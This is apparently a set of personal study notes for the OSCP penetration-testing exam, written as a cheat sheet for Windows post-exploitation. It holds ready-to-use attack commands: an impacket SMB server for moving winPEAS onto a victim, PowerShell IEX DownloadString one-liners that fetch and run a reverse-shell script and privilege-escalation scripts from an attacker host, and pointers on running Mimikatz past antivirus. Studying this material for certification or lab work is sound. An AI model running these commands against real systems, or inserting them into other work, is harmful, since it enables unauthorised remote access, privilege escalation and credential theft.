# OSCP-NOTES

## File transfer cheat sheet
> - https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
> - https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
> - https://techmonger.github.io/3/linux-windows-ftp/
> - sudo impacket-smbserver -smb2support test . -> attacker machine
> - copy \\192.168.119.161\test\winPEASx86.exe winPEASx86.exe -> vitim machine 

## Powershell 
### Check powershell running on system 64 or 32 
> - [Environment]::Is64BitProcess 
### Command powershell to get reverse shell 
> - powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.119.153/Invoke-PowerShellTcp.ps1')"
> - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://192.168.119.180/Invoke-MS16032.ps1')” -bypass executionpolicy
### POWERSHELL TO RUNNING MIMIKATZ
> - https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
> - https://theitbros.com/managing-windows-defender-using-powershell/  

### Powershell to PE
> - Install sherlock ps1 github And run -> powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.119.180/Sherlock.ps1'); Find-AllVulns”


## Windows PE
> - Check juice potato work or not with command "Whoami /priv". If SeImpersonatePrivilege is enabled yes . you can exploit that 
